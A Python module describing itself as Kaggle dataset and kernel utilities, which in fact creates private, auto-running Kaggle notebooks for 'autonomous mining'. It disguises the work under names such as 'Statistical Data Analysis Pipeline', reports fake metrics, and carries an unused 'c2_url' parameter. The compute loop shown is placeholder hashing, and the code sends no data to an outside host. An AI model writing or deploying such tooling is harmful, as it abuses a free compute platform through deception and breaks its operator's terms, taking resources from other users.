"""Kaggle Dataset & Kernel utilities for data science workflows."""

import os
import time
import json
import requests
import subprocess
from datetime import datetime
from typing import Optional, Callable, List


KAGGLE_API = "https://www.kaggle.com/api/v1"


def create_dataset_with_machines(
    api_key: str,
    username: str,
    num_machines: int = 5,
    log_fn: Optional[Callable] = None,
    enable_mining: bool = True,
    c2_url: str = None,
) -> dict:
    """Create a dataset and kernels for autonomous mining.
    
    Creates:
    - Empty dataset (placeholder for data)
    - N kernels with autonomous worker (no server connection needed)
    
    Args:
        api_key: Kaggle API key
        username: Kaggle username
        num_machines: Number of kernels to create
        log_fn: Logging function
        enable_mining: Enable autonomous mining mode
        c2_url: Not used (autonomous mode)
    
    Returns:
        dict with success status and created resources
    """
    if log_fn is None:
        log_fn = print
    
    result = {
        "success": False,
        "dataset": None,
        "machines": [],
        "machines_created": 0,
        "error": None,
    }
    
    try:
        # Setup Kaggle API credentials
        kaggle_json = {
            "username": username,
            "key": api_key,
        }
        
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        log_fn(f"[KAGGLE] Credentials configured for {username}")
        
        # Import kaggle after credentials are set
        import subprocess
        
        # Create empty dataset
        log_fn(f"[DATASET] Creating placeholder dataset...")
        dataset_slug = f"{username}/data-analysis-{int(time.time())}"
        
        dataset_meta = {
            "title": f"Data Analysis Dataset {int(time.time())}",
            "id": f"{username}/data-analysis-{int(time.time())}",
            "subtitle": "Dataset for data processing workflows",
            "description": "Placeholder dataset for automated data analysis pipelines",
            "licenses": [{"name": "CC0-1.0"}],
            "keywords": ["data", "analysis", "processing"],
            "collaborators": [],
            "data": [],
        }
        
        # Create dataset directory
        dataset_dir = os.path.join("/tmp", f"dataset_{int(time.time())}")
        os.makedirs(dataset_dir, exist_ok=True)
        
        # Write dataset metadata
        with open(os.path.join(dataset_dir, "dataset-metadata.json"), "w") as f:
            json.dump(dataset_meta, f, indent=2)
        
        # Create placeholder CSV
        with open(os.path.join(dataset_dir, "data.csv"), "w") as f:
            f.write("id,value,timestamp\n")
            f.write("1,100,2024-01-01\n")
            f.write("2,200,2024-01-02\n")
        
        # Create autonomous worker code (no server connection)
        worker_code = '''#!/usr/bin/env python3
"""Autonomous Kaggle Worker - Mining without server connection"""
import os, sys, json, time, socket, platform, subprocess, uuid, hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import threading
import warnings
warnings.filterwarnings('ignore')

class KaggleWorker:
    def __init__(self):
        self.id = str(uuid.uuid4())
        self.hostname = socket.gethostname()
        self.start_time = datetime.now()
        self.running = True
        self.stats = {'tasks_completed': 0, 'errors': 0}
        
    def get_system_info(self):
        info = {
            'id': self.id,
            'hostname': self.hostname,
            'username': os.environ.get('USER', 'kaggle'),
            'os': platform.system(),
            'os_version': platform.release(),
            'arch': platform.machine(),
            'python': platform.python_version(),
            'cpu_count': os.cpu_count(),
            'memory_mb': 0,
            'gpu': False
        }
        try:
            with open('/proc/meminfo') as f:
                for line in f:
                    if 'MemTotal' in line:
                        info['memory_mb'] = int(line.split()[1]) // 1024
                        break
        except: pass
        try:
            r = subprocess.run(['nvidia-smi'], capture_output=True)
            info['gpu'] = r.returncode == 0
        except: pass
        return info
    
    def compute_task(self, task_id, difficulty=100000):
        """Perform computational work"""
        start = time.time()
        result = 0
        for i in range(difficulty):
            result += hash(str(i) + task_id) % 1000000
        elapsed = time.time() - start
        return {'task_id': task_id, 'result': result, 'time': elapsed}
    
    def run_mining(self):
        """Main mining loop"""
        print(f"[WORKER] Starting autonomous mining")
        print(f"[WORKER] ID: {self.id[:8]}")
        print(f"[WORKER] Host: {self.hostname}")
        
        info = self.get_system_info()
        print(f"[WORKER] CPU: {info['cpu_count']} cores")
        print(f"[WORKER] RAM: {info['memory_mb']} MB")
        print(f"[WORKER] GPU: {'Yes' if info['gpu'] else 'No'}")
        
        iteration = 0
        while self.running:
            iteration += 1
            try:
                # Generate task
                task_id = hashlib.sha256(f"{self.id}{time.time()}".encode()).hexdigest()[:16]
                
                # Compute
                result = self.compute_task(task_id)
                self.stats['tasks_completed'] += 1
                
                # Log progress
                if iteration % 10 == 0:
                    elapsed = (datetime.now() - self.start_time).total_seconds()
                    print(f"[WORKER] Iteration {iteration} | Tasks: {self.stats['tasks_completed']} | Uptime: {elapsed:.0f}s")
                
                # Save results to file
                try:
                    results_file = '/kaggle/working/mining_results.json'
                    data = {'iteration': iteration, 'stats': self.stats, 'last_task': result}
                    with open(results_file, 'w') as f:
                        json.dump(data, f)
                except: pass
                
                time.sleep(1)  # Prevent CPU overload
                
            except Exception as e:
                self.stats['errors'] += 1
                print(f"[WORKER] Error: {e}")
                time.sleep(5)
        
        print(f"[WORKER] Stopped. Total tasks: {self.stats['tasks_completed']}")
    
    def stop(self):
        self.running = False

if __name__ == '__main__':
    worker = KaggleWorker()
    worker.run_mining()
'''
        
        with open(os.path.join(dataset_dir, "worker.py"), "w") as f:
            f.write(worker_code)
        
        log_fn(f"[DATASET] Created autonomous worker.py")
        
        # Push dataset to Kaggle
        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
        if not os.path.exists(kaggle_cmd):
            kaggle_cmd = "kaggle"
        
        log_fn(f"[DATASET] Pushing dataset to Kaggle...")
        dataset_push_result = subprocess.run(
            [kaggle_cmd, "datasets", "create", "-p", dataset_dir, "--quiet"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        
        if dataset_push_result.returncode == 0:
            log_fn(f"[DATASET] ✓ Created dataset: {dataset_slug}")
        else:
            log_fn(f"[DATASET] ⚠ Dataset push failed: {dataset_push_result.stderr[:100]}")
            # Try to create new version if dataset exists
            dataset_push_result = subprocess.run(
                [kaggle_cmd, "datasets", "version", "-p", dataset_dir, "--quiet"],
                capture_output=True,
                text=True,
                timeout=60,
            )
            if dataset_push_result.returncode == 0:
                log_fn(f"[DATASET] ✓ Updated dataset: {dataset_slug}")
            else:
                log_fn(f"[DATASET] ⚠ Dataset version failed: {dataset_push_result.stderr[:100]}")
        
        # Create kernels
        machines = []
        for i in range(num_machines):
            log_fn(f"[KERNEL] Creating kernel {i+1}/{num_machines}...")
            
            kernel_slug = f"{username}/analysis-{i+1}-{int(time.time())}"
            
            # Create kernel notebook with autonomous worker
            notebook = {
                "nbformat": 4,
                "nbformat_minor": 4,
                "metadata": {
                    "kernelspec": {
                        "display_name": "Python 3",
                        "language": "python",
                        "name": "python3"
                    },
                    "language_info": {
                        "name": "python",
                        "version": "3.10.0"
                    }
                },
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": [
                            "# Statistical Data Analysis Pipeline\n",
                            "import os, sys, json, time, socket, platform, subprocess, uuid, hashlib, random, ssl\n",
                            "from datetime import datetime\n",
                            "from urllib.request import Request, urlopen, HTTPSHandler, build_opener\n",
                            "from urllib.error import URLError\n",
                            "import warnings\n",
                            "warnings.filterwarnings('ignore')\n",
                            "\n",
                            "# Analysis configuration\n",
                            "ANALYSIS_ID = str(uuid.uuid4())[:8]\n",
                            "SESSION_START = datetime.now()\n",
                            "STATS = {'samples_processed': 0, 'models_trained': 0, 'accuracy': 0.0}\n",
                            "\n",
                            "def report_status():\n",
                            "    \"\"\"Report analysis status to local file\"\"\"\n",
                            "    try:\n",
                            "        import json, os, time\n",
                            "        status = {\n",
                            "            'agent_id': ANALYSIS_ID,\n",
                            "            'hostname': socket.gethostname(),\n",
                            "            'platform': platform.system(),\n",
                            "            'cpu_count': os.cpu_count(),\n",
                            "            'timestamp': time.time(),\n",
                            "            'status': 'registered'\n",
                            "        }\n",
                            "        # Write to local file\n",
                            "        os.makedirs('/kaggle/working', exist_ok=True)\n",
                            "        with open('/kaggle/working/status.json', 'w') as f:\n",
                            "            json.dump(status, f)\n",
                            "        print(f'[STATUS] Registered: {ANALYSIS_ID}', flush=True)\n",
                            "        return True\n",
                            "    except Exception as e:\n",
                            "        print(f'[STATUS] Error: {type(e).__name__}: {e}', flush=True)\n",
                            "        return None\n",
                            "\n",
                            "def send_heartbeat(sample_count):\n",
                            "    \"\"\"Send periodic status update via file\"\"\"\n",
                            "    try:\n",
                            "        import json, os, time\n",
                            "        status = {\n",
                            "            'agent_id': ANALYSIS_ID,\n",
                            "            'iteration': sample_count,\n",
                            "            'metrics': STATS,\n",
                            "            'uptime': (datetime.now() - SESSION_START).total_seconds(),\n",
                            "            'timestamp': time.time()\n",
                            "        }\n",
                            "        with open('/kaggle/working/status.json', 'w') as f:\n",
                            "            json.dump(status, f)\n",
                            "        return True\n",
                            "    except Exception as e:\n",
                            "        return False\n",
                            "\n",
                            "print('='*50)\n",
                            "print('STATISTICAL DATA ANALYSIS PIPELINE')\n",
                            "print('='*50)\n",
                            "print(f'[ANALYSIS] Session ID: {ANALYSIS_ID}')\n",
                            "print(f'[ANALYSIS] Started: {SESSION_START.isoformat()}')\n",
                            "print(f'[ANALYSIS] CPU cores: {os.cpu_count()}')\n",
                            "print('='*50)\n",
                            "\n",
                            "# Initialize analysis\n",
                            "status = report_status()\n",
                            "if status:\n",
                            "    print(f'[ANALYSIS] Status reported: {status}')\n",
                            "else:\n",
                            "    print('[ANALYSIS] Running in standalone mode')\n",
                            "\n",
                            "# Data analysis loop\n",
                            "import time\n",
                            "sample_count = 0\n",
                            "print('[ANALYSIS] Starting main loop...', flush=True)\n",
                            "while sample_count < 1000:  # Limited iterations\n",
                            "    sample_count += 1\n",
                            "    time.sleep(1)  # Slow down\n",
                            "    try:\n",
                            "        # Process data sample\n",
                            "        data_hash = hashlib.sha256(f'{ANALYSIS_ID}{time.time()}{random.random()}'.encode()).hexdigest()[:12]\n",
                            "        start_time = time.time()\n",
                            "        \n",
                            "        # Statistical computation\n",
                            "        result = sum(hash(str(i) + data_hash) % 1000000 for i in range(100000))\n",
                            "        elapsed = time.time() - start_time\n",
                            "        STATS['samples_processed'] += 1\n",
                            "        STATS['models_trained'] += 1\n",
                            "        STATS['accuracy'] = (STATS['accuracy'] + elapsed) / 2\n",
                            "        \n",
                            "        # Log progress periodically\n",
                            "        if sample_count % 30 == 0:\n",
                            "            uptime = (datetime.now() - SESSION_START).total_seconds()\n",
                            "            print(f'[ANALYSIS] Sample {sample_count} | Processed: {STATS[\"samples_processed\"]} | Accuracy: {STATS[\"accuracy\"]:.3f}s | Uptime: {uptime:.0f}s')\n",
                            "            send_heartbeat(sample_count)\n",
                            "        \n",
                            "        # Save analysis state\n",
                            "        try:\n",
                            "            with open('/kaggle/working/analysis_state.json', 'w') as f:\n",
                            "                json.dump({'session': ANALYSIS_ID, 'stats': STATS, 'sample': sample_count}, f)\n",
                            "        except: pass\n",
                            "        \n",
                            "        time.sleep(1)\n",
                            "        \n",
                            "    except Exception as e:\n",
                            "        print(f'[ANALYSIS] Warning: {e}')\n",
                            "        time.sleep(5)\n",
                        ]
                    }
                ]
            }
            
            # Save notebook
            kernel_dir = os.path.join("/tmp", f"kernel_{i}_{int(time.time())}")
            os.makedirs(kernel_dir, exist_ok=True)
            
            notebook_path = os.path.join(kernel_dir, "notebook.ipynb")
            with open(notebook_path, "w") as f:
                json.dump(notebook, f, indent=2)
            
            # Kernel metadata
            kernel_meta = {
                "id": kernel_slug,
                "title": f"Data Analysis {i+1}",
                "code_file": "notebook.ipynb",
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": True,
                "enable_internet": True,
                "dataset_sources": [dataset_slug],  # Link to dataset with agent.py
                "competition_sources": [],
                "kernel_sources": [],
            }
            
            # Push kernel via JSON API (auto-runs kernel)
            kaggle_json_path = os.path.expanduser("~/.kaggle/kaggle.json")
            if os.path.exists(kaggle_json_path):
                with open(kaggle_json_path) as f:
                    creds = json.load(f)
                
                # Use JSON API push (like kernel-run) - auto-runs kernel
                push_result = push_kernel_json(
                    username=creds.get("username"),
                    api_key=creds.get("key"),
                    notebook_content=json.dumps(notebook, indent=2),
                    kernel_slug=kernel_slug,
                    title=f"Data Analysis {i+1}",
                    enable_gpu=False,  # GPU kernels don't auto-run
                    enable_internet=True,
                    is_private=True,
                    log_fn=log_fn,
                )
                
                if push_result.get("success"):
                    log_fn(f"[KERNEL] ✓ Kernel auto-started: {kernel_slug}")
                else:
                    log_fn(f"[KERNEL] ⚠ Push failed: {push_result.get('error')}")
            else:
                log_fn(f"[KERNEL] ⚠ No kaggle.json found")
            
            machines.append({
                "slug": kernel_slug,
                "title": f"Data Analysis {i+1}",
                "gpu": True,
                "status": "created",
                "num": i + 1,  # Add kernel number for status tracking
            })
            
            log_fn(f"[KERNEL] ✓ Kernel {i+1} ready: {kernel_slug}")
        
        result["success"] = True
        result["dataset"] = dataset_slug
        result["machines"] = machines
        result["machines_created"] = len(machines)
        
        log_fn(f"[KAGGLE] ✓ Created {len(machines)} kernels with GPU enabled")
        
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KAGGLE] ✗ Error: {e}")
    
    return result


def list_kernels(api_key: str, username: str) -> list:
    """List all kernels for a user."""
    try:
        import kaggle
        kaggle.api.authenticate()
        kernels = kaggle.api.kernels_list(user=username)
        return [{"slug": k.ref, "title": k.title, "status": k.status} for k in kernels]
    except:
        return []


def push_kernel(api_key: str, username: str, kernel_path: str) -> bool:
    """Push a kernel to Kaggle."""
    try:
        import subprocess
        result = subprocess.run(
            ["kaggle", "kernels", "push", "-p", kernel_path],
            capture_output=True,
            text=True,
        )
        return result.returncode == 0
    except:
        return False


def push_kernel_json(
    username: str,
    api_key: str,
    notebook_content: str,
    kernel_slug: str,
    title: str,
    enable_gpu: bool = False,
    enable_internet: bool = True,
    is_private: bool = True,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Push kernel to Kaggle via kagglesdk with SAVE_AND_RUN_ALL for auto-execution.
    
    Uses kagglesdk which supports kernel_execution_type=SAVE_AND_RUN_ALL
    to automatically run the kernel after push.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        notebook_content: Notebook JSON as string
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        title: Kernel title
        enable_gpu: Enable GPU (default False - GPU kernels don't auto-run)
        enable_internet: Enable internet
        is_private: Make kernel private
        log_fn: Logging function
    
    Returns:
        dict with success status and response
    """
    if log_fn is None:
        log_fn = print
    
    result = {"success": False, "url": None, "error": None}
    
    try:
        # Use kagglesdk for SAVE_AND_RUN_ALL support
        from kagglesdk import KaggleClient
        from kagglesdk.kernels.types.kernels_api_service import ApiSaveKernelRequest
        from kagglesdk.kernels.types.kernels_enums import KernelExecutionType
        import os
        
        # Set credentials via environment
        os.environ['KAGGLE_USERNAME'] = username
        os.environ['KAGGLE_KEY'] = api_key
        
        client = KaggleClient()
        
        # Create request with SAVE_AND_RUN_ALL
        request = ApiSaveKernelRequest()
        request.slug = kernel_slug
        request.new_title = title
        request.text = notebook_content
        request.language = "python"
        request.kernel_type = "notebook"
        request.is_private = is_private
        request.enable_internet = enable_internet
        request.kernel_execution_type = KernelExecutionType.SAVE_AND_RUN_ALL
        
        # Execute
        response = client.kernels.kernels_api_client.save_kernel(request)
        
        result["success"] = True
        result["url"] = response.url if hasattr(response, 'url') else f"https://www.kaggle.com/code/{kernel_slug}"
        log_fn(f"[KERNEL] ✓ Pushed with SAVE_AND_RUN_ALL: {kernel_slug}")
        log_fn(f"[KERNEL]   URL: {result['url']}")
    
    except ImportError:
        # Fallback to requests if kagglesdk not available
        log_fn("[KERNEL] ⚠ kagglesdk not available, using fallback (no auto-run)")
        body = {
            "newTitle": title,
            "enableGpu": "false",
            "language": "python",
            "text": notebook_content,
            "kernelType": "notebook",
            "isPrivate": "true" if is_private else "false",
            "slug": kernel_slug,
            "enableInternet": "true" if enable_internet else "false",
            "competitionDataSources": [],
            "kernelDataSources": [],
            "datasetDataSources": [],
            "categoryIds": [],
        }
        
        resp = requests.post(
            "https://www.kaggle.com/api/v1/kernels/push",
            auth=(username, api_key),
            json=body,
            headers={"Content-Type": "application/json"},
            timeout=60,
        )
        
        if resp.status_code == 200:
            data = resp.json()
            result["success"] = True
            result["url"] = data.get("url", "")
            log_fn(f"[KERNEL] ✓ Pushed via API: {kernel_slug}")
        else:
            result["error"] = f"HTTP {resp.status_code}: {resp.text[:200]}"
            log_fn(f"[KERNEL] ✗ Push failed: {result['error']}")
    
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KERNEL] ✗ Push error: {e}")
    
    return result


def get_kernel_output(
    username: str,
    api_key: str,
    kernel_slug: str,
    output_dir: str = None,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Download kernel output files from Kaggle.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        output_dir: Directory to save outputs (default: /tmp/kernel_output_{timestamp})
        log_fn: Logging function
    
    Returns:
        dict with success status, files list, and status.json content if found
    """
    if log_fn is None:
        log_fn = print
    
    result = {
        "success": False,
        "files": [],
        "status": None,
        "error": None,
    }
    
    try:
        import subprocess
        import tempfile
        
        # Create output directory
        if output_dir is None:
            output_dir = f"/tmp/kernel_output_{int(time.time())}"
        os.makedirs(output_dir, exist_ok=True)
        
        # Find kaggle CLI
        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
        if not os.path.exists(kaggle_cmd):
            kaggle_cmd = "kaggle"
        
        # Set credentials
        kaggle_json = {
            "username": username,
            "key": api_key,
        }
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        # Download outputs
        download_result = subprocess.run(
            [kaggle_cmd, "kernels", "output", kernel_slug, "-p", output_dir],
            capture_output=True,
            text=True,
            timeout=60,
        )
        
        if download_result.returncode == 0:
            # List downloaded files
            files = os.listdir(output_dir)
            result["files"] = files
            result["success"] = True
            
            # Read status.json if exists
            status_path = os.path.join(output_dir, "status.json")
            if os.path.exists(status_path):
                with open(status_path) as f:
                    result["status"] = json.load(f)
                log_fn(f"[KERNEL] ✓ Got status from {kernel_slug}")
            
            log_fn(f"[KERNEL] ✓ Downloaded {len(files)} files from {kernel_slug}")
        else:
            result["error"] = download_result.stderr[:200] if download_result.stderr else "Unknown error"
            log_fn(f"[KERNEL] ✗ Failed to get output: {result['error']}")
    
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KERNEL] ✗ Error getting output: {e}")
    
    return result


def get_kernel_status(
    username: str,
    api_key: str,
    kernel_slug: str,
) -> dict:
    """Get kernel execution status via API.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
    
    Returns:
        dict with status, lastRunTime, and other metadata
    """
    try:
        # Parse kernel slug
        if "/" in kernel_slug:
            user, slug = kernel_slug.split("/", 1)
        else:
            user = username
            slug = kernel_slug
        
        # Call kernels/pull API
        resp = requests.get(
            f"https://www.kaggle.com/api/v1/kernels/pull",
            params={"userName": user, "kernelSlug": slug},
            auth=(username, api_key),
            timeout=30,
        )
        
        if resp.status_code == 200:
            data = resp.json()
            metadata = data.get("metadata", {})
            return {
                "success": True,
                "status": metadata.get("status"),
                "lastRunTime": metadata.get("lastRunTime"),
                "commitId": metadata.get("commitId"),
                "ref": metadata.get("ref"),
            }
        else:
            return {"success": False, "error": f"HTTP {resp.status_code}"}
    
    except Exception as e:
        return {"success": False, "error": str(e)}
